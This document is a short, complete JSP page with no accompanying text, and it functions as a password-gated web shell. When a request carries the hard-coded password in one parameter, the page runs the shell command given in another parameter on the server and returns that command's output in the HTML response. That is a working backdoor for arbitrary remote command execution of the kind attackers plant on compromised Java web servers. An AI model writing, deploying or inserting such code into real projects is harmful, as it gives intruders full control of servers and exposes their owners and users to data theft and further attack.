<%@ page import="java.io.InputStream" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    if ("shaqima".equals(request.getParameter("ladypwd"))) {
        InputStream in = Runtime.getRuntime().exec(request.getParameter("infocmd").split(" ")).getInputStream();
        int ret = -1;
        byte[] bs = new byte[2048];
        out.print("<pre>");
        while((ret = in.read(bs)) != -1) {
           out.println(new String(bs));
        }
        out.print("</pre>");
    }
%>

